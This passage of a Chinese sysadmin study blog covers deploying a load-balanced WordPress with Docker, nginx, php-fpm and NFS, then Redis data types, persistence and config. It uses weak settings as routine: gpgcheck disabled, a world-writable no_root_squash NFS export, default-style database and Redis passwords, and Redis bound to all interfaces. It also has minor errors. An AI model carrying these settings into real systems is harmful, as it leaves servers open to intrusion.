title="4.负载均衡架构"></a>4.负载均衡架构</h2><p>nginx：前端负载均衡</p><p>web01，web02：docker部署</p><p>备份服务器：web01和web02互相使用rsync脚本同步，同步前先完成一遍复制确保一致</p><p>web01和web02再备份一次到备份服务器</p><p>3方—4方—多方同步解决</p><p>目前只能实现docker单节点部署wordpress，通过脚本自动备份到远端132的机器</p><p>1.环境：可以在slave1上面搭建web02站点</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">搭建docker环境，搭建私有仓库<br>1.关闭防火墙，SELINUX<br>sed <span class="hljs-string">&#x27;s/enable/disabled/g&#x27;</span> /etc/config/selinux<br><br>2.卸载旧版本的docker包<br>rpm -qa | grep docker<br>yum -y remove docker*，删除掉所有的依赖<br><br>3.docker安装存储库<br>yum install -y yum-utils device-mapper-persistent-data lvm2<br><br>4.添加阿里云的yum源<br>    yum-config-manager --add-repo https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo<br>修改内部的gpgcheck<br>:%s/gpgcheck=1/gpgcheck=0/g<br>sed -i <span class="hljs-string">&#x27;s/gpgcheck=1/gpgcheck=0/g&#x27;</span> /etc/yum.repos.d/docker-ce.repo<br><br>5.安装docker-ce<br>yum install docker-ce docker-ce-cli containerd.io -y<br><br>scp -r /etc/docker/* 10.0.0.129:/etc/docker/<br><br>6.修改docker的源daemon.json<br><br>systemctl daemon-reload;systemctl restart docker<br><br>7.测试安装服务<br>docker images<br>docker ps -a<br><br><br>yum -y install httpd php php-mysqlnd php-json<br><span class="hljs-built_in">chown</span> apache.apache /var/www/html/*<br>ll /var/www/html/*<br></code></pre></td></tr></table></figure><p>2.拷贝所有web01站点的信息过去，docker需要映射出来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.配置docker基础环境<br><br>--拉取最新镜像<br>docker pull wordpress<br><br>--拉取仓库镜像，运行<br>docker pull registry<br>docker run -d -p 5000:5000 --restart=always --name registry -v /apps/myregistry:/var/lib/registry registry<br><br>--打标签<br>docker image tag wordpress 10.0.0.128:5000/wordpress:v1.0<br>[root@master registry]<span class="hljs-comment">#docker images</span><br>REPOSITORY                  TAG       IMAGE ID       CREATED         SIZE<br>10.0.0.128:5000/wordpress   v1.0      c3c92cc3dcb1   9 months ago    616MB<br><br>--配置insucure的镜像仓库地址<br>vim /etc/docker/daemon.json<br>&#123;<br>    <span class="hljs-string">&quot;registry-mirrors&quot;</span>: [<br>        <span class="hljs-string">&quot;https://plqjafsr.mirror.aliyuncs.com&quot;</span><br>    ],<br>    <span class="hljs-string">&quot;exec-opts&quot;</span>: [<br>        <span class="hljs-string">&quot;native.cgroupdriver=systemd&quot;</span><br>    ],<br>    <span class="hljs-string">&quot;log-driver&quot;</span>: <span class="hljs-string">&quot;json-file&quot;</span>,<br>    <span class="hljs-string">&quot;log-opts&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;max-size&quot;</span>: <span class="hljs-string">&quot;100m&quot;</span><br>    &#125;,<br>    <span class="hljs-string">&quot;storage-driver&quot;</span>: <span class="hljs-string">&quot;overlay2&quot;</span>,<br>    <span class="hljs-string">&quot;insecure-registries&quot;</span>: [<span class="hljs-string">&quot;10.0.0.128:5000&quot;</span>] ---配置本地仓库<br>&#125;<br><br>--重新加载<br>systemctl daemon-reload<br>systemctl restart docker<br><br>--推送，查看<br>docker push 10.0.0.128:5000/wordpress:v1.0<br>curl http://10.0.0.128:5000/v2/_catalog<br>&#123;<span class="hljs-string">&quot;repositories&quot;</span>:[<span class="hljs-string">&quot;wordpress&quot;</span>]&#125;<br><br>--slave1尝试<br>[root@slave1 ~]<span class="hljs-comment">#curl http://10.0.0.128:5000/v2/_catalog</span><br>&#123;<span class="hljs-string">&quot;repositories&quot;</span>:[<span class="hljs-string">&quot;wordpress&quot;</span>]&#125;<br><br><br>2.slave1拉取镜像，运行<br><br>--slave1<br>docker pull 10.0.0.128:5000/wordpress:v1.0<br><br>docker run --name wordpress -p 8002:80 --restart=always -v /apps/wordpress:/var/www/html/  -d 10.0.0.128:5000/wordpress:v1.0<br>docker run --name wordpress -p 8002:80 --restart=always -v /apps/wordpress:/var/www/html/  -d wordpress<br>docker start `docker ps -a | grep wordpress | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span>`<br><br>--拷贝web01的文件到/apps/wordpress<br>scp -r -p /apps/wordpress/* 10.0.0.129:/apps/wordpress/<br><br>rsync -a /apps/wordpress/* 10.0.0.129:/apps/wordpress/<br><br>3.试运行<br>docker stop `docker ps -a | grep wordpress | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span>`<br>docker start `docker ps -a | grep wordpress | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span>`<br>docker <span class="hljs-built_in">rm</span> -f `docker ps -a | grep wordpress | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span>`<br></code></pre></td></tr></table></figure><p>3.配置WEB01的DNS解析，添加A记录</p><p>4.前端添加一个nginx，实现前端负载均衡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##mysql创建库和用户</span><br>1.部署数据库<br>create database wordpress;<br><br>[(none)]&gt;drop user wordpress@<span class="hljs-string">&#x27;%&#x27;</span>;<br>Query OK, 0 rows affected (0.00 sec)<br><br>[(none)]&gt;flush privileges;<br>Query OK, 0 rows affected (0.00 sec)<br><br><span class="hljs-comment">##删除用户后需要刷新权限</span><br><br>[(none)]&gt;create user wordpress@<span class="hljs-string">&#x27;%&#x27;</span> identified by <span class="hljs-string">&#x27;wordpress&#x27;</span>;<br>Query OK, 0 rows affected (0.02 sec)<br><br>[(none)]&gt;grant all on wordpress.* to wordpress@<span class="hljs-string">&#x27;%&#x27;</span>;<br>Query OK, 0 rows affected (0.01 sec)<br><br>[(none)]&gt;flush privileges;<br>Query OK, 0 rows affected (0.00 sec)<br><br>2.获取wordpress包，修改wordpress的权限<br>wget https://cn.wordpress.org/latest-zh_CN.tar.gz<br><br>[root@master wordpress]<span class="hljs-comment">#cp -p -r wordpress/* /apps/nginx/html/php/</span><br><span class="hljs-built_in">cp</span>: overwrite ‘/apps/nginx/html/php/index.php’? y<br><br><span class="hljs-built_in">chown</span> -R nginx.nginx php/<br><br>3.修改nginx代理支持php，安装mysql支持包，json包，因为里面有json格式的文件<br>yum -y install php-fpm php-mysqlnd php-json<br><br><span class="hljs-comment">##非.php的文件，会在本机找，所以本机需要有这些文件，最好是PHP程序和nginx在一台机器上，不用分开找这些文件</span><br>root /apps/nginx/html/mobile/php;<br><br>[root@slave1 mobile]<span class="hljs-comment">#ls php/</span><br>index.php    readme.html  wp-activate.php  wp-blog-header.php    wp-config-sample.php  wp-cron.php  wp-links-opml.php  wp-login.php  wp-settings.php  wp-trackback.php<br>license.txt  test.php     wp-admin         wp-comments-post.php  wp-content            wp-includes  wp-load.php        wp-mail.php   wp-signup.php    xmlrpc.php<br><br><br>location ~ \.php$ &#123;<br>                root /apps/nginx/html/php; <span class="hljs-comment">##默认是html/php</span><br>                fastcgi_pass 10.0.0.128:9000; <span class="hljs-comment">##PHP服务器地址，默认本机</span><br>                fastcgi_index index.php; <span class="hljs-comment">##默认php页面          </span><br>                fastcgi_param SCRIPT_FILENAME $document_root<span class="hljs-variable">$fastcgi_script_name</span>;<br>                include fastcgi_params; <span class="hljs-comment">#此文件默认系统已提供,存放的相对路径为/conf下，是一个固定的参数，用于nginx转换到fastcgi</span><br>        &#125;<br><br>        location ~ ^/(ping|php_status)$ &#123;<br>        fastcgi_pass 10.0.0.128:9000;<br>        <span class="hljs-comment">#fastcgi_pass 127.0.0.1:9000;</span><br>        fastcgi_param PATH_TRANSLATED $document_root<span class="hljs-variable">$fastcgi_script_name</span>;<br>        include fastcgi_params;<br>        &#125;<br><br>4.访问http://mobile.catyer.cn/wp-admin/<br>5.部署<br>6.修改上传最大size<br>access_log  /apps/nginx/logs/mobile_access.log main;<br>        root /apps/nginx/html/mobile/php;<br>        index index.php;<br>        client_max_body_size 20m; <span class="hljs-comment">##nginx参数</span><br><br><span class="hljs-comment">##仅存在于代理服务器+php服务器的情况</span><br>7.使用nfs共享PHP服务器的路径<br>vim /etc/exports<br>/apps/nginx/html/php *(rw,no_root_squash)<br><br><span class="hljs-comment">##生效，show一下路径</span><br>[root@master html]<span class="hljs-comment">#exportfs -r</span><br>[root@master html]<span class="hljs-comment">#exportfs -v</span><br>/apps/nginx/html/php<br>&lt;world&gt;(<span class="hljs-built_in">sync</span>,wdelay,hide,no_subtree_check,sec=sys,rw,secure,no_root_squash,no_all_squash)<br><br><span class="hljs-comment">##129挂载</span><br>[root@slave1 conf.d]<span class="hljs-comment">#mount 10.0.0.128:/apps/nginx/html/php /apps/nginx/html/mobile/php</span><br>10.0.0.128:/apps/nginx/html/php nfs4       38G   22G   17G  57% /apps/nginx/html/mobile/php<br><br>8.写入到永久挂载<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;10.0.0.128:/apps/nginx/html/php /apps/nginx/html/mobile/php nfs defaults,_netdev 0 0&quot;</span> &gt;&gt; /etc/fstab<br><br>9.如果是多个wordpress机器，则使用nfs共享目录即可，nginx服务可以是两个机器，目录一个即可，rsync来备份upload下面的信息即可<br>[root@slave1 uploads]<span class="hljs-comment">#pwd</span><br>/apps/nginx/html/mobile/php/wp-content/uploads<br><br>sersync同步过去即可，带权限同步到备份机器<br>rsync -a /apps/nginx/html/mobile/php/wp-content/uploads<br><br>10.代理可以转发到后端的两台php机器，php机器只要保证目录数据一致即可，PHP支持程序代码<br><br>upstream wordpress&#123;<br>ip_hash;<br>server 10.0.0.128 weight=1;<br>server 10.0.0.129 weight=1;<br>&#125;<br><br>location /php &#123;<br>proxy_pass https://wordpress/;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="5-redis数据类型有哪些？"><a href="#5-redis数据类型有哪些？" class="headerlink" title="5. redis数据类型有哪些？"></a>5. redis数据类型有哪些？</h1><h2 id="key：string类型，指定键值对"><a href="#key：string类型，指定键值对" class="headerlink" title="key：string类型，指定键值对"></a>key：string类型，指定键值对</h2><p>字符串类型</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##key的</span><br><span class="hljs-built_in">set</span> key value<br>get key<br><br>mset key1 value1 key2 value2...<br>mget key1 key2...<br><br><span class="hljs-comment">##key大小写敏感，不一样的大小写的key不一样</span><br><span class="hljs-comment">##可选选项</span><br>127.0.0.1:6379&gt; <span class="hljs-built_in">set</span> key value [EX seconds|PX milliseconds|EXAT timestamp|PXAT milliseconds-timestamp|KEEPTTL] [NX|XX] [GET]<br><br><span class="hljs-comment">##设置这个变量10s后过期，比如红包100块，10s后过期</span><br><span class="hljs-built_in">set</span> hongbao 100 EX 10<br>127.0.0.1:6379&gt; get hongbao<br>(nil)<br><br><span class="hljs-comment">##type：查看key类型</span><br>127.0.0.1:6379&gt; <span class="hljs-built_in">set</span> c1 1<br>OK<br>127.0.0.1:6379&gt; <span class="hljs-built_in">set</span> c2 2<br>OK<br>127.0.0.1:6379&gt; <span class="hljs-built_in">type</span> c1<br>string<br><br><span class="hljs-comment">##ttl：查看key的有效期</span><br>127.0.0.1:6379&gt; <span class="hljs-built_in">set</span> hongbao 100 ex 100<br>OK<br>127.0.0.1:6379&gt; ttl hongbao<br>(<span class="hljs-built_in">integer</span>) 97<br><br><span class="hljs-comment">##递增INCR=INCREMENT，类似MySQL的主键递增，id auto_increment</span><br>127.0.0.1:6379&gt; <span class="hljs-built_in">set</span> num 10<br>OK<br>127.0.0.1:6379&gt; INCR num<br>(<span class="hljs-built_in">integer</span>) 11<br>127.0.0.1:6379&gt; INCR num<br>(<span class="hljs-built_in">integer</span>) 12<br></code></pre></td></tr></table></figure><h2 id="list：类似数组，称为列表"><a href="#list：类似数组，称为列表" class="headerlink" title="list：类似数组，称为列表"></a>list：类似数组，称为列表</h2><p>类似数组</p><p><img src="2792175-20221121202629096-789509727.png" alt="img"></p><p>定义一个数组</p><p>array=(0,1,2,3)</p><p>下标：array[0]，[1]以此类推</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">LPUSH：从左边开始编号，索引为0,1,2,3...<br>RPUSH：从右边开始编号，索引为-1.-2,-3...<br><br>lindex：从左边开始查看<br>rindex：从右边<br><br><span class="hljs-comment">##顺序：a b c，先推c，再ba</span><br>127.0.0.1:6379&gt; lpush list1 c b a<br>(<span class="hljs-built_in">integer</span>) 3<br>127.0.0.1:6379&gt; lindex list1 0 ---&gt;最左边为a<br><span class="hljs-string">&quot;a&quot;</span><br>127.0.0.1:6379&gt; lindex list1 -1 ---&gt;最右边为c<br><span class="hljs-string">&quot;c&quot;</span><br><br><span class="hljs-built_in">type</span> list1<br>127.0.0.1:6379&gt; <span class="hljs-built_in">type</span> list1<br>list<br></code></pre></td></tr></table></figure><h2 id="sets：集合，取交集-并集-差集，共同认识的好友"><a href="#sets：集合，取交集-并集-差集，共同认识的好友" class="headerlink" title="sets：集合，取交集/并集/差集，共同认识的好友"></a>sets：集合，取交集/并集/差集，共同认识的好友</h2><p>集合：无序的字符串放在里面，同一个集合内的元素不能重复，唯一的；不同的集合之间可以取并集，实现统计，例如共同好友等</p><p>里面可以是各种字符串</p><p>集合之间的操作</p><p><img src="2792175-20221121202629599-582889119.png" alt="img"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##定义两个无序集合</span><br>sadd my mary tom bob<br>sadd your mary tony jerry<br><br><br><span class="hljs-comment">##里面有3个元素</span><br>127.0.0.1:6379&gt; sadd my mary tom bob<br>(<span class="hljs-built_in">integer</span>) 3<br>127.0.0.1:6379&gt; sadd your mary tony jerry<br>(<span class="hljs-built_in">integer</span>) 3<br><br><span class="hljs-comment">##集合之间的操作，sinter：共同的元素，交集</span><br><span class="hljs-comment">##smembers：查看集合的元素</span><br>127.0.0.1:6379&gt; smembers my<br>1) <span class="hljs-string">&quot;tom&quot;</span><br>2) <span class="hljs-string">&quot;bob&quot;</span><br>3) <span class="hljs-string">&quot;mary&quot;</span><br>127.0.0.1:6379&gt; smembers your<br>1) <span class="hljs-string">&quot;tony&quot;</span><br>2) <span class="hljs-string">&quot;jerry&quot;</span><br>3) <span class="hljs-string">&quot;mary&quot;</span><br>127.0.0.1:6379&gt; sinter my your<br>1) <span class="hljs-string">&quot;mary&quot;</span><br><br><span class="hljs-comment">##sunion：并集，所有合起来，不包括重复的，因为集合内的元素都是唯一的</span><br>127.0.0.1:6379&gt; sunion my your<br>1) <span class="hljs-string">&quot;mary&quot;</span><br>2) <span class="hljs-string">&quot;bob&quot;</span><br>3) <span class="hljs-string">&quot;tom&quot;</span><br>4) <span class="hljs-string">&quot;tony&quot;</span><br>5) <span class="hljs-string">&quot;jerry&quot;</span><br><br><span class="hljs-comment">##sdiff：差集，set1有set2没有，或者是set2有set1没有，比如一群朋友就是一个集合等；社交场景可能认识的人</span><br>127.0.0.1:6379&gt; sdiff my your<br>1) <span class="hljs-string">&quot;tom&quot;</span><br>2) <span class="hljs-string">&quot;bob&quot;</span><br></code></pre></td></tr></table></figure><h2 id="sorted-sets：有序集合，常用于排行榜-名字-分数对"><a href="#sorted-sets：有序集合，常用于排行榜-名字-分数对" class="headerlink" title="sorted sets：有序集合，常用于排行榜(名字-分数对)"></a>sorted sets：有序集合，常用于排行榜(名字-分数对)</h2><p>按照一定的次序进行集合内的排序，比如排行榜，百度搜索的集合；或者是基于ES推荐的</p><p>ES内存储的就是无序集合</p><p><img src="2792175-20221121202630071-1565291608.png" alt="img"></p><p>每个元素都是由score和value组成的，可以根据分数来对人(value)进行排名，或者是别的值，比如说商品根据购买量、好评数等参数来进行排序，就可以使用有序集合sorted</p><p><img src="2792175-20221121202630660-1637903724.png" alt="img"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##添加一个集合，music歌手的排行榜</span><br><span class="hljs-comment">##有序集合内有多个键值对</span><br>127.0.0.1:6379&gt; ZADD music 99 jay 90 eason 85 feiniao 70 joey<br>(<span class="hljs-built_in">integer</span>) 4<br><br><span class="hljs-comment">##正序排序，由小到大，=order by ，最左边是最后插入的，索引为0；最右边为最先插入的，索引为1，这条是遍历所有的值</span><br>127.0.0.1:6379&gt; ZREVRANGE music 0 -1<br>1) <span class="hljs-string">&quot;jay&quot;</span><br>2) <span class="hljs-string">&quot;eason&quot;</span><br>3) <span class="hljs-string">&quot;feiniao&quot;</span><br>4) <span class="hljs-string">&quot;joey&quot;</span><br><br><span class="hljs-comment">##倒序排序</span><br>127.0.0.1:6379&gt; ZRANGE music 0 -1<br>1) <span class="hljs-string">&quot;joey&quot;</span><br>2) <span class="hljs-string">&quot;feiniao&quot;</span><br>3) <span class="hljs-string">&quot;eason&quot;</span><br>4) <span class="hljs-string">&quot;jay&quot;</span><br></code></pre></td></tr></table></figure><h2 id="hash：哈希值"><a href="#hash：哈希值" class="headerlink" title="hash：哈希值"></a>hash：哈希值</h2><p>hash map操作</p><h1 id="6-redis-RDB和AOF比较？"><a href="#6-redis-RDB和AOF比较？" class="headerlink" title="6. redis RDB和AOF比较？"></a>6. redis RDB和AOF比较？</h1><p>redis RDB：实现redis的持久化存储，重启redis服务会重新加载rdb存储，存储路径可以在redis内自定义，RDB类似MySQL的mysqldump，全量复制</p><p>可以基于.RDB文件进行定时的备份，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">data rdb save <span class="hljs-built_in">dir</span><br></code></pre></td></tr></table></figure><p>AOF：实时的数据更新，只要有redis库的数据更新，则更新一份.aof文件，包括增删改等操作；</p><p>采用COW机制：copy on write，只要有数据更新，就会实时写入到.aof文件，无论是增加（set value）、删除（del value）、修改（set value）都一样</p><p>AOF的优先级高于RDB，如果两项都开启的话，默认redis读.aof</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">.aof的数据写入磁盘规则，每秒钟写一次磁盘，无论在1s(everysec)内有多少数据更新都是整合成一次IO进行写入<br>always规则：已有更新就写入，适用于金融型的场景的交易数据，需要写成always<br><br>--appendfsync always<br>--appendfsync everysec<br><span class="hljs-comment"># appendfsync no</span><br><span class="hljs-comment">##共同点</span><br>都可以实现redis保存数据的持久化，不必说redis重启或者其他操作导致数据丢失<br><br><span class="hljs-comment">##执行方式</span><br>1.RDB：通过save/bgsave来保存当前状态下的快照，不会实时记录数据变化<br>2.AOF：实时记录数据变化，实时写入AOF文件<br><br><span class="hljs-comment">##缺点</span><br>1.RDB：不会实时记录数据变化，安全性较低<br>2.AOF：造成大量数据的写入，占用磁盘空间<br><br><span class="hljs-comment">##应用场景</span><br>1.如果redis只是缓存，则只启动RDB就行，主要的备份还是MySQL那些，因为主要的数据加速读写还是MySQL、sql server作为主库<br>2.如果数据安全性要求高，建议RDB和AOF同时开启<br></code></pre></td></tr></table></figure><h1 id="7-redis配置文件详解。"><a href="#7-redis配置文件详解。" class="headerlink" title="7. redis配置文件详解。"></a>7. redis配置文件详解。</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">        sed -i -e <span class="hljs-string">&#x27;s/bind 127.0.0.1/bind 0.0.0.0/&#x27;</span>  -e <span class="hljs-string">&quot;/# requirepass/a requirepass <span class="hljs-variable">$PASSWORD</span>&quot;</span>  -e <span class="hljs-string">&quot;/^dir .*/c dir <span class="hljs-variable">$&#123;INSTALL_DIR&#125;</span>/data/&quot;</span>  -e <span class="hljs-string">&quot;/logfile .*/c logfile <span class="hljs-variable">$&#123;INSTALL_DIR&#125;</span>/log/redis-6379.log&quot;</span>  -e  <span class="hljs-string">&quot;/^pidfile .*/c  pidfile <span class="hljs-variable">$&#123;INSTALL_DIR&#125;</span>/run/redis_6379.pid&quot;</span> <span class="hljs-variable">$&#123;INSTALL_DIR&#125;</span>/etc/redis.conf<br><br>sed -e表示修改多个地方<br><br><span class="hljs-built_in">bind</span> 0.0.0.0 <span class="hljs-comment">##修改监听，远程连接，/^bind</span><br>requirepass 123456 <span class="hljs-comment">##启用密码,/^require</span><br><span class="hljs-built_in">dir</span> /apps/redis/data/ <span class="hljs-comment">##数据目录</span><br>logfile /apps/redis/log/redis-6379.<span class="hljs-built_in">log</span> <span class="hljs-comment">##日志目录，记录redis的日志</span><br>=pidfile /apps/redis/run/redis_6379.pid <span class="hljs-comment">##进程ID号文件</span><br><br>slowlog-log-slower-than 1000 <span class="hljs-comment">##默认10ms，还是太长了</span><br>slowlog-max-len 128 <span class="hljs-comment">#记录最近的128条慢日志</span><br><br><span class="hljs-comment"># will silently truncate it to the value of /proc/sys/net/core/somaxconn so</span><br>tcp-backlog 511：全连接队列，这里必须是写的511，所以之前的net.core.somaxconn = 1024，需要根据程序调大一点<br><br>dbfilename dump.rdb <span class="hljs-comment">##持久化数据文件，默认开启RDB功能</span><br><br><span class="hljs-comment">##查看配置文件，默认值，自动触发bgsave的默认配置规则</span><br>/^<span class="hljs-comment"># save</span><br>save 3600 1<br>save 300 100<br>save 60 10000<br><br><span class="hljs-comment">##aof配置</span><br>appendonly <span class="hljs-built_in">yes</span><br><span class="hljs-comment"># The name of the append only file (default: &quot;appendonly.aof&quot;)</span><br>appendfilename <span class="hljs-string">&quot;appendonly.aof&quot;</span><br><br><span class="hljs-comment">#单节点客户端最高是10000并发</span><br>maxclients 10000<br><span class="hljs-comment"># maxclients 10000</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>第六周</title>
    <link href="/2023/07/28/%E7%AC%AC%E5%85%AD%E5%91%A8/"/>
